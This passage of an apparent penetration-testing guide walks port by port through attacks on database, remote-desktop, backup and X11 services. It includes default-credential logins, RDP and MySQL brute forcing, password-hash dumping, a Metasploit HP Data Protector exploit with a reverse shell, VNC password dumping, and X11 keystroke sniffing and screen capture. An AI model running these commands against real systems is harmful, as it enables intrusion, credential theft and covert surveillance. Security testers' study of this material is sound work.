    node.session.err_timeo.lu_reset_timeout = 30
    node.session.err_timeo.tgt_reset_timeout = 30
    node.session.err_timeo.host_reset_timeout = 60
    node.session.iscsi.FastAbort = Yes
    node.session.iscsi.InitialR2T = No
    node.session.iscsi.ImmediateData = Yes
    node.session.iscsi.FirstBurstLength = 262144
    node.session.iscsi.MaxBurstLength = 16776192
    node.session.iscsi.DefaultTime2Retain = 0
    node.session.iscsi.DefaultTime2Wait = 2
    node.session.iscsi.MaxConnections = 1
    node.session.iscsi.MaxOutstandingR2T = 1
    node.session.iscsi.ERL = 0
    node.conn[0].address = 192.168.xx.xx
    node.conn[0].port = 3260
    node.conn[0].startup = manual
    node.conn[0].tcp.window_size = 524288
    node.conn[0].tcp.type_of_service = 0
    node.conn[0].timeo.logout_timeout = 15
    node.conn[0].timeo.login_timeout = 15
    node.conn[0].timeo.auth_timeout = 45
    node.conn[0].timeo.noop_out_interval = 5
    node.conn[0].timeo.noop_out_timeout = 5
    node.conn[0].iscsi.MaxXmitDataSegmentLength = 0
    node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144
    node.conn[0].iscsi.HeaderDigest = None
    node.conn[0].iscsi.DataDigest = None
    node.conn[0].iscsi.IFMarker = No
    node.conn[0].iscsi.OFMarker = No
    # END RECORD

We have created a script to automate login/ logout process available at <a href="https://github.com/bitvijays/Pentest-Scripts/tree/master/Vulnerability_Analysis/isciadm" class="reference external">iscsiadm</a>

# Port 3299 - SAP Router

morisson has written a blog on <a href="https://community.rapid7.com/community/metasploit/blog/2014/01/09/piercing-saprouter-with-metasploit" class="reference external">Piercing SAProuter with Metasploit</a>

# Port 3306 - MySQL

Always test the following:

Username: root
Password: root

```text
mysql --host=192.168.1.101 -u root -p
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname> -u ""@localhost

telnet 192.168.0.101 3306
```

You will most likely see this a lot:

```text
ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server
```

This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.

## Configuration files

```text
cat /etc/my.cnf
```

[http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html](http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html)

## Mysql-commands cheat sheet

```text
http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html
```

## Uploading a shell

```text
You can also use mysql to upload a shell
```

## Escalating privileges

If mysql is started as root you might have a chance to use it as a way to escalate your privileges.

**MYSQL UDF INJECTION:**

[https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

## Finding passwords to mysql

You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?

So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:

```text
/var/www/html/configuration.php
```

In that file you find the


```
<?php
class JConfig {
   var $mailfrom = 'admin@rainng.com';
   var $fromname = 'testuser';
   var $sendmail = '/usr/sbin/sendmail';
   var $password = 'myPassowrd1234';
   var $sitename = 'test';
   var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
   var $MetaKeys = 'joomla, Joomla';
   var $offline_message = 'This site is down for maintenance. Please check back again soon.';
   }
```

## Metasploit

### MySQL Server Version Enumeration

Enumerates the version of MySQL servers

    use auxiliary/scanner/mysql/mysql_version
    services -p 3306 -u -R

Sample Output:
```
    [*] 10.7.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
    [*] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
    [*] Scanned  5 of 44 hosts (11% complete)
    [*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 5.5.35-0ubuntu0.12.04.2 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 5.0.95 (protocol 10)
    [*] Scanned  9 of 44 hosts (20% complete)
    [*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
    [*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MariaDB server
    [*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
    [*] Scanned 14 of 44 hosts (31% complete)
    [*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
    [*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
    [*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
    [*] Scanned 18 of 44 hosts (40% complete)
    [*] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 5.6.17 (protocol 10)
    [*] 10.10.xx.xx:3306 is running MySQL 5.1.50-community (protocol 10)
```
### MySQL Login Utility

Validate login or brute force logins. This module simply queries the MySQL instance for a specific user/pass (default is root with blank)

    use auxiliary/scanner/mysql/mysql_login
    services -p 3306 -u -R
    set username root
    set password example@123

Sample Output:
```
    [*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
    [+] 10.10.xx.xx:3306 MYSQL - Success: 'root:example@123'
    [*] Scanned 22 of 44 hosts (50% complete)
    [*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
    [+] 10.10.xx.xx:3306 MYSQL - Success: 'root:example@123'
    [-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
    [-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
    [*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.6.15
    [-] 10.10.xx.xx:3306 MYSQL - LOGIN FAILED: root:example@123 (Incorrect:
```
Once we have to username passsword for the root we can use:

### MYSQL Password Hashdump

to extract the usernames and encrypted password hashes from a MySQL server.

    use auxiliary/scanner/mysql/mysql_hashdump
    creds -p 3306 -t password -u root -R
    set username root
    set password example@123

Sample Output:
```
    [-] MySQL Error: RbMysql::HandshakeError Bad handshake
    [-] There was an error reading the MySQL User Table
    [*] Scanned 4 of 6 hosts (66% complete)
    [+] Saving HashString as Loot: root:6FE073B02F77230C092415032F0FF0951FXXXXXX
    [+] Saving HashString as Loot: wordpress:A31B8F449706C32558ABC788DDABF62DCCXXXXXX
    [+] Saving HashString as Loot: root:6FE073B02F77230C092415032F0FF0951FXXXXXX
    [+] Scanned 5 of 6 hosts (83% complete)
    [+] Saving HashString as Loot: newsgroupdbo:6FE073B02F77230C092415032F0FF0951FXXXXXX
    [+] Saving HashString as Loot: intiadda:6FE073B02F77230C092415032F0FF0951XXXXXX
    [+] Saving HashString as Loot: newsgroupdbo:6FE073B02F77230C092415032F0FF0951FXXXXXX
```
## Other

### mysql command

Once we have the username and password, we can use **mysql utility** to login in to the server.

    mysql -u root -p -h 10.10.xx.xx

# Port 3339 - Oracle Web Int

# Port 3389 - RDP

This is a proprietary protocol developed by windows to allow remote desktop.

Log in like this

```text
rdesktop -u guest -p guest 10.11.1.5 -g 94%
```

Brute force like this

```text
ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
```

## Ms12-020

This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.


# Port 4555 - RSIP

I have seen this port being used by Apache James Remote Configuration.

There is an exploit for version 2.3.2

[https://www.exploit-db.com/docs/40123.pdf](https://www.exploit-db.com/docs/40123.pdf)

# Port 47001 - Windows Remote Management Service

Windows Remote Management Service

# Port 5432 - Postgresql

## Metasploit

### PostgreSQL Version Probe

Enumerates the version of PostgreSQL servers.

    use auxiliary/scanner/postgres/postgres_version

### PostgreSQL Login Utility

Module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER\_FILE, PASS\_FILE, and USERPASS\_FILE options.

    use auxiliary/scanner/postgres/postgres_login

### PostgreSQL Database Name Command Line Flag Injection

Identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution

    use auxiliary/scanner/postgres/postgres_dbname_flag_injection

<span id="id88"></span>

# Port 5555 - HPDataProtector RCE

HPData proctector service was running on port no. 5555.

    msf > services -p 5555

    Services
    ========
    host          port  proto  name      state  info
    ----          ----  -----  ----      -----  ----
    10.x.x.x      5555  tcp    omniback  open   HP OpenView Omniback/Data Protector
    10.x.x.x      5555  tcp    omniinet  open   HP Data Protector 7.00 build 105
    10.x.x.x      5555  tcp    freeciv   open
    10.x.x.x      5555  tcp    omniinet  open   HP Data Protector 7.00 build 105
    10.x.x.x      5555  tcp    omniback  open   HP Data Protector A.07.00 internal build 105; built on Wednesday, October 16, 2013, 10:55 PM

Metasploit framework comes with an exploit for exploiting this vulnerability. which can be searched by

    msf > search integutil

    Matching Modules
    ================

     Name                                                 Disclosure Date  Rank   Description
     ----                                                 ---------------  ----   -----------
     exploit/multi/misc/hp_data_protector_exec_integutil  2014-10-02       great  HP Data Protector EXEC_INTEGUTIL Remote Code ExecutionNOw

Now this can be used by

    msf > use exploit/multi/misc/hp_data_protector_exec_integutil
    msf exploit(hp_data_protector_exec_integutil) > show options

    Module options (exploit/multi/misc/hp_data_protector_exec_integutil):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    RHOST                   yes       The target address
    RPORT  5555             yes       The target port (TCP)

    Exploit target:
    Id  Name
    --  ----
    0   Automatic

Select the appropriate target by using

    msf exploit(hp_data_protector_exec_integutil) > show targets

    Exploit targets:

    Id  Name
    --  ----
    0   Automatic
    1   Linux 64 bits / HP Data Protector 9
    2   Windows 64 bits / HP Data Protector 9

    msf exploit(hp_data_protector_exec_integutil) > set target 2    - for windows environment.

set the appropriate RHOST and payloads by

    msf exploit(hp_data_protector_exec_integutil) > set RHOST 10.1.1.1
    RHOST => 10.1.1.1
    msf exploit(hp_data_protector_exec_integutil) > show payloads

    Compatible Payloads
    ===================

    Name                            Disclosure Date  Rank    Description
    ----                            ---------------  ----    -----------
    cmd/windows/reverse_powershell                   normal  Windows Command Shell, Reverse TCP (via Powershell)

set all the necessary options and run. After this we can use Empire stagerlauncher or web\_delivery to a get a meterpreter shell on our attacking machine.

Before metasploit module was present people from OpenSecurity Research were able to exploit it by sniffing the data Nessus Plugin sent. More details at <a href="http://blog.opensecurityresearch.com/2012/08/manually-exploiting-hp-data-protector.html" class="reference external">Manually Exploiting HP Data Protector</a>

# Port 5722 - DFSR

> The Distributed File System Replication \(DFSR\) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.

I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller.

# Port 5900 - VNC

VNC is used to get a screen for a remote host. But some of them have some exploits.

You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.

It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords

```text
background
use post/windows/gather/credentials/vnc
set session X
exploit
```

```text
vncviewer 192.168.1.109
```

## Ctr-alt-del

If you are unable to input ctr-alt-del \(kali might interpret it as input for kali\).

Try `shift-ctr-alt-del`

We always find openVNCs in an engagement.

## Metasploit

### VNC Authentication None Detection

Detect VNC servers that support the “None” authentication method.

    use auxiliary/scanner/vnc/vnc_none_auth

### VNC Authentication Scanner

Module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.

    use auxiliary/scanner/vnc/vnc_login

## VNC Password

~/.vnc/passwd is the default location where the VNC password is stored. The password is stored at this location when the vncserver starts for a first time. To update or change your VNC password you should use vncpasswd command.

    echo MYVNCPASSWORD | vncpasswd -f > ~/.secret/passvnc
    Warning: password truncated to the length of 8.

    cat ~/.secret/passvnc
    kRS�ۭx8

Now, if we have found the password file of the VNC on some CTF challenge or vulnerable machine, we can either decrypt it (to know the password) using <a href="https://github.com/jeroennijhof/vncpwd" class="reference external">VNC Password Decrypter</a> or use the password file while using vncviewer

    vncviewer hostname-of-vnc-server -passwd ~/.secret/passvnc

# Port 5984 - CouchDB

## Other

    curl http://IP:5984/

This issues a GET request to installed CouchDB instance.

The reply should look something like:

    {"couchdb":"Welcome","version":"0.10.1"}

### Database List

    curl -X GET http://IP:5984/_all_dbs

or

    curl -X GET http://user:password@IP:5984/_all_dbs

Response might be

    ["baseball", "plankton"]

### Document List
```
    curl -X GET http://IP:5984/{dbname}/_all_docs

    Response

        {
           "offset": 0,
           "rows": [
               {
                   "id": "16e458537602f5ef2a710089dffd9453",
                   "key": "16e458537602f5ef2a710089dffd9453",
                   "value": {
                       "rev": "1-967a00dff5e02add41819138abb3284d"
                   }
               },
               {
                   "id": "a4c51cdfa2069f3e905c431114001aff",
                   "key": "a4c51cdfa2069f3e905c431114001aff",
                   "value": {
                       "rev": "1-967a00dff5e02add41819138abb3284d"
                   }
               },
           ],
           "total_rows": 2
        }
```
### Read Value Document

    curl -X GET http://IP:5984/{dbname}/{id}

# X11 - Port 6000

We do also find a lot of open X11 servers, we can use x11 to find the keyboard strokes and screenshots.

## Metasploit

### X11 No-Auth Scanner

Module scans for X11 servers that allow anyone to connect without authentication.

    auxiliary/scanner/x11/open_x11
    services -p 6000 -u -R

Sample output
```
    [*] 10.9.xx.xx Access Denied
    [*] 10.9.xx.xx Open X Server (The XFree86 Project, Inc)
    [*] Scanned  5 of 45 hosts (11% complete)
    [-] No response received due to a timeout
    [*] 10.10.xx.xx Access Denied
    [*] Scanned  9 of 45 hosts (20% complete)
    [*] 10.11.xx.xx Access Denied
    [*] Scanned 14 of 45 hosts (31% complete)
    [*] 10.15.xx.xx Access Denied
    [*] Scanned 18 of 45 hosts (40% complete)
    [*] 10.19.xx.xx Access Denied
    [*] Scanned 23 of 45 hosts (51% complete)
    [*] Scanned 27 of 45 hosts (60% complete)
    [*] Scanned 32 of 45 hosts (71% complete)
    [*] 10.20.xx.xx Open X Server (Xfree86-Heidenhain-Project)
```
### X11 Keyboard Command Injection

    use exploit/unix/x11/x11_keyboard_exec

For more information: Refer: <a href="http://rageweb.info/2014/05/04/open-x11-server/" class="reference external">Open-x11-server</a>

## Other

### xspy

<a href="http://tools.kali.org/sniffingspoofing/xspy" class="reference external">xspy</a> to sniff the keyboard keystrokes.

Sample Output:

    xspy 10.9.xx.xx

    opened 10.9.xx.xx:0 for snoopng
    swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
    qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab

### xdpyinfo

We can also use x11 to grab **screenshots or live videos** of the user. We need to verify the connection is open and we can get to it:

    xdpyinfo -display <ip>:<display>

Sample Output:

    xdpyinfo -display 10.20.xx.xx:0
    name of display:    10.20.xx.xx:0
    version number:    11.0
    vendor string:    Xfree86-Heidenhain-Project
    vendor release number:    0
    maximum request size:  262140 bytes
    motion buffer size:  0
    bitmap unit, bit order, padding:    32, LSBFirst, 32
    image byte order:    LSBFirst
    number of supported pixmap formats:    6
    supported pixmap formats:
        depth 1, bits_per_pixel 1, scanline_pad 32
        depth 4, bits_per_pixel 8, scanline_pad 32
        depth 8, bits_per_pixel 8, scanline_pad 32
        depth 15, bits_per_pixel 16, scanline_pad 32
        depth 16, bits_per_pixel 16, scanline_pad 32
        depth 24, bits_per_pixel 32, scanline_pad 32
    keycode range:    minimum 8, maximum 255
    focus:  window 0x600005, revert to Parent
    number of extensions:    11
       FontCache
        MIT-SCREEN-SAVER
        MIT-SHM
        RECORD
        SECURITY
        SHAPE
        XC-MISC
        XFree86-DGA
        XFree86-VidModeExtension
        XInputExtension
        XVideo
    default screen number:    0
    number of screens:    1
     screen #0:
     dimensions:    1024x768 pixels (347x260 millimeters)
      resolution:    75x75 dots per inch
      depths (6):    16, 1, 4, 8, 15, 24
      root window id:    0x25
      depth of root window:    16 planes
      number of colormaps:    minimum 1, maximum 1
      default colormap:    0x20
      default number of colormap cells:    64
      preallocated pixels:    black 0, white 65535
      options:    backing-store NO, save-unders NO
      largest cursor:    32x32
      current input event mask:    0x0
      number of visuals:    2
      default visual id:  0x21
      visual:
      visual id:    0x21
      class:    TrueColor
      depth:    16 planes
      available colormap entries:    64 per subfield
      red, green, blue masks:    0xf800, 0x7e0, 0x1f
      significant bits in color specification:    6 bits
    visual:
      visual id:    0x22
      class:    DirectColor
      depth:    16 planes
      available colormap entries:    64 per subfield
      red, green, blue masks:    0xf800, 0x7e0, 0x1f
      significant bits in color specification:    6 bits

### xwd

To take the **screenshot** use:

    xwd -root -display 10.20.xx.xx:0 -out xdump.xdump
    display xdump.xdump

### xwininfo

**live viewing**:

First we need to find the ID of the window using xwininfo

    xwininfo -root -display 10.9.xx.xx:0

    xwininfo: Window id: 0x45 (the root window) (has no name)

    Absolute upper-left X:  0
    Absolute upper-left Y:  0
    Relative upper-left X:  0
    Relative upper-left Y:  0
    Width: 1024
    Height: 768
    Depth: 16
    Visual: 0x21
    Visual Class: TrueColor
    Border width: 0
    Class: InputOutput
    Colormap: 0x20 (installed)
    Bit Gravity State: ForgetGravity
    Window Gravity State: NorthWestGravity
    Backing Store State: NotUseful
    Save Under State: no
    Map State: IsViewable
    Override Redirect State: no
    Corners:  +0+0  -0+0  -0-0  +0-0
    -geometry 1024x768+0+0

### XWatchwin

For **live viewing** we need to use

    ./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
    ./xwatchwin 10.9.xx.xx:0 -w 0x45


# Port 8009 - AJP Apache JServ

The Tomcat manager interface is usually accessed on the Tomcat HTTP(S) port. but we often do forget that we can also access that manager interface on port 8009 that by default handles the AJP (Apache JServ Protocol) protocol.

> AJP is a wire protocol. Its an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible, but proxy the request to Tomcat for Tomcat related contents.

Sometimes we do encounter situation where port:8009 is open and the rest port 8080,8180,8443 or 80 are closed. in these kind of scenario we can use metasploit framework to exploit the services running. Here, we can configure Apache to proxy the requests to Tomcat port 8009. details for doing so is given in the reference. Below is an overview of the commands (apache must already be installed) as mentioned in <a href="https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/" class="reference external">8009 The Forgotten Tomcat Port</a>.

    sudo apt-get install libapach2-mod-jk
    sudo vim /etc/apache2/mods-available/jk.conf
    # Where to find workers.properties
    # Update this path to match your conf directory location
    JkWorkersFile /etc/apache2/jk_workers.properties
    # Where to put jk logs
    # Update this path to match your logs directory location
    JkLogFile /var/log/apache2/mod_jk.log
    # Set the jk log level [debug/error/info]
    JkLogLevel info
    # Select the log format
    JkLogStampFormat "[%a %b %d %H:%M:%S %Y]"
    # JkOptions indicate to send SSL KEY SIZE,
    JkOptions +ForwardKeySize +ForwardURICompat -ForwardDirectories
    # JkRequestLogFormat set the request format
    JkRequestLogFormat "%w %V %T"
    # Shm log file
    JkShmFile /var/log/apache2/jk-runtime-status
    sudo ln -s /etc/apache2/mods-available/jk.conf /etc/apache2/mods-enabled/jk.conf
    sudo vim /etc/apache2/jk_workers.properties
    # Define 1 real worker named ajp13
    worker.list=ajp13
    # Set properties for worker named ajp13 to use ajp13 protocol,
    # and run on port 8009
    worker.ajp13.type=ajp13
    worker.ajp13.host=localhost
    worker.ajp13.port=8009
    worker.ajp13.lbfactor=50
    worker.ajp13.cachesize=10
    worker.ajp13.cache_timeout=600
    worker.ajp13.socket_keepalive=1
    worker.ajp13.socket_timeout=300
    sudo vim /etc/apache2/sites-enabled/000-default
    JkMount /* ajp13
    JkMount /manager/   ajp13
    JkMount /manager/*  ajp13
    JkMount /host-manager/   ajp13
    JkMount /host-manager/*  ajp13
    sudo a2enmod proxy_ajp
    sudo a2enmod proxy_http
    sudo /etc/init.d/apache2 restart

Here we have to set the worker.ajp13.host to the correct host and we can just point out the metapsloit tomcat exploit to localhost:80 and compromise.

    msf  exploit(tomcat_mgr_deploy) > show options

    Module options (exploit/multi/http/tomcat_mgr_deploy):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    PASSWORD  tomcat           no        The password for the specified username
    PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
    Proxies                    no        Use a proxy chain
    RHOST     localhost        yes       The target address
    RPORT     80               yes       The target port
    USERNAME  tomcat           no        The username to authenticate as
    VHOST                      no        HTTP server virtual host

-   References:

<a href="http://wiki.apache.org/tomcat/FAQ/Connectors" class="reference external">Connectors</a>
<a href="http://tomcat.apache.org/connectors-doc-archive/jk2/common/AJPv13.html" class="reference external">AJPv13</a>
<a href="http://blog.rajeevsharma.in/2010/02/configure-modjk-with-apache-22-in.html" class="reference external">Configure modjk with apache</a>


# Port 9100 - PJL

## Metasploit

There are multiple modules in the metasploit for PJL.

    Name                                             Disclosure Date  Rank    Description
    ----                                             ---------------  ----    -----------
    auxiliary/scanner/printer/printer_delete_file                     normal  Printer File Deletion Scanner
    auxiliary/scanner/printer/printer_download_file                   normal  Printer File Download Scanner
    auxiliary/scanner/printer/printer_env_vars                        normal  Printer Environment Variables Scanner
    auxiliary/scanner/printer/printer_list_dir                        normal  Printer Directory Listing Scanner
    auxiliary/scanner/printer/printer_list_volumes                    normal  Printer Volume Listing Scanner
    auxiliary/scanner/printer/printer_ready_message                   normal  Printer Ready Message Scanner
    auxiliary/scanner/printer/printer_upload_file                     normal  Printer File Upload Scanner
    auxiliary/scanner/printer/printer_version_info                    normal  Printer Version Information Scanner
    auxiliary/server/capture/printjob_capture                         normal  Printjob Capture Service

As of now, We only got a chance to use

### Printer Version Information Scanner

Scans for printer version information using the Printer Job Language (PJL) protocol.

    use auxiliary/scanner/printer/printer_version_info

Sample Output:
```
    [+] 10.10.xx.xx:9100 - HP LaserJet M1522nf MFP
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```
## Nmap

### PJL-ready-message

<a href="https://nmap.org/nsedoc/scripts/pjl-ready-message.html" class="reference external">PJL-ready-message</a> : It retrieves or sets the ready message on printers that support the Printer Job Language. This includes most PostScript printers that listen on port 9100. Without an argument, displays the current ready message. With the pjl\_ready\_message script argument, displays the old ready message and changes it to the message given.

Sample Output:
```
    nmap --script=pjl-ready-message.nse -n -p 9100 10.10.xx.xx

    Nmap scan report for 10.10.xx.xx
    Host is up (0.14s latency).
    PORT     STATE SERVICE
    9100/tcp open  jetdirect
    |_pjl-ready-message: "Processing..."
```

# Port 9160 - Apache Cassandra

For Apache Cassandra,

## Nmap

### Cassandra-info

<a href="https://nmap.org/nsedoc/scripts/cassandra-info.html" class="reference external">cassandra-info.nse</a> which attempts to get basic info and server status from a Cassandra database.

Sample Output:

    nmap -p 9160 10.10.xx.xx -n --script=cassandra-info

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-27 21:14 IST
    Nmap scan report for 10.10.xx.xx
    Host is up (0.16s latency).
    PORT     STATE SERVICE
    9160/tcp open  cassandra
    | cassandra-info:
    |   Cluster name: Convoy
    |_  Version: 19.20.0

### Cassandra-brute

<a href="https://nmap.org/nsedoc/scripts/cassandra-brute.html" class="reference external">cassandra-brute</a> which performs brute force password auditing against the Cassandra database.

Sample Output:
```
    nmap -p 9160 122.166.xx.xx -n --script=cassandra-brute

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-27 21:19 IST
    Nmap scan report for 122.166.xx.xx
    Host is up (0.083s latency).
    PORT     STATE SERVICE
    9160/tcp open  apani1
    |_cassandra-brute: Any username and password would do, 'default' was used to test
```

# Port 10000 - NDMP

Network Data Management Protocol

## Nmap

### ndmp-fs-info

<a href="https://nmap.org/nsedoc/scripts/ndmp-fs-info.html" class="reference external">ndmp-fs-info.nse</a> can be used to list remote file systems

    services -s ndmp -p 10000
    services -p 10000 -s ndmp -o /tmp/ndmp.ports
    cat /tmp/ndmp.ports | cut -d , -f1 | tr -d \" | grep -v host > /tmp/ndmp.ports.2

Pass this to nmap

    nmap -p 10000 --script ndmp-fs-info -n -iL /tmp/ndmp.ports.2

Sample Output:
```
    | ndmp-fs-info:
    | FS       Logical device             Physical device
    | NTFS     C:                         Device0000
    | NTFS     D:                         Device0000
    | NTFS     E:                         Device0000
    | RMAN     Oracle-Win::\\TRDPLM\WIND  Device0000
    | UNKNOWN  Shadow Copy Components     Device0000
    |_UNKNOWN  System State               Device0000
```

### ndmp-version

<a href="https://nmap.org/nsedoc/scripts/ndmp-version.html" class="reference external">ndmp-version</a> : Retrieves version information from the remote Network Data Management Protocol (ndmp) service. NDMP is a protocol intended to transport data between a NAS device and the backup device, removing the need for the data to pass through the backup server. This nse although is not outputing the version correctly, however if we switch to –script-trace we do find the versions
```
    00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00
    00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
    00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.
    00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
    00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3
    00000060: 00 00 00 be 00 00 00 05 00 00 00 04

    NSOCK INFO [5.0650s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 1122 [10.10.xx.xx:10000] (108 bytes)
    NSE: TCP 10.10.xx.xx:40435 < 10.10.9.12:10000 | 00000000: 80 00 00 68 00 00 00 03 56 f1 64 e7 00 00 00 01    h    V d
    00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00
    00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
    00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.
    00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
    00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3
```

# Port 11211 - Memcache

Memcached is a free & open source, high-performance, distributed memory object caching system.

## Nmap

### memcached-info

<a href="https://nmap.org/nsedoc/scripts/memcached-info.html" class="reference external">memcached-info</a> : Retrieves information (including system architecture, process ID, and server time) from distributed memory object caching system memcached.

Sample Output:

    nmap -p 11211 --script memcached-info 10.10.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-03-27 02:48 IST
    Nmap scan report for email.xxxxxx.com (10.10.xx.xx)
    Host is up (0.082s latency).
    PORT      STATE SERVICE
    11211/tcp open  unknown
    | memcached-info:
    |   Process ID           4252
    |   Uptime               1582276 seconds
    |   Server time          2016-03-26T21:18:15
    |   Architecture         64 bit
    |   Used CPU (user)      25.881617
    |   Used CPU (system)    17.413088
    |   Current connections  14
    |   Total connections    41
    |   Maximum connections  1024
    |   TCP Port             11211
    |   UDP Port             11211
    |_  Authentication       no

    Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds

### Other

We can also telnet to this port: Stats is one of the commands

    telnet 10.10.xx.xx 11211
    stats
    STAT pid 4252
    STAT uptime 1582386
    STAT time 1459027205
    STAT version 1.4.10
    STAT libevent 2.0.16-stable
    STAT pointer_size 64
    STAT rusage_user 25.889618
    STAT rusage_system 17.417088
    STAT curr_connections 14
    STAT total_connections 42
    STAT connection_structures 15
    STAT reserved_fds 20
    STAT cmd_get 3
    STAT cmd_set 3
    STAT cmd_flush 0
    STAT cmd_touch 0
    STAT get_hits 2
    STAT get_misses 1
    STAT delete_misses 0
    STAT delete_hits 0
    STAT incr_misses 0
    STAT incr_hits 0
    STAT decr_misses 0
    STAT decr_hits 0
    STAT cas_misses 0
    STAT cas_hits 0
    STAT cas_badval 0
    STAT touch_hits 0
    STAT touch_misses 0
    STAT auth_cmds 0
    STAT auth_errors 0
    STAT bytes_read 775
    STAT bytes_written 26158
    STAT limit_maxbytes 67108864
    STAT accepting_conns 1
    STAT listen_disabled_num 0
    STAT threads 4
    STAT conn_yields 0
    STAT hash_power_level 16
    STAT hash_bytes 524288
    STAT hash_is_expanding 0
    STAT expired_unfetched 0
    STAT evicted_unfetched 0
    STAT bytes 87
    STAT curr_items 1
    STAT total_items 1
    STAT evictions 0
    STAT reclaimed 0
    END

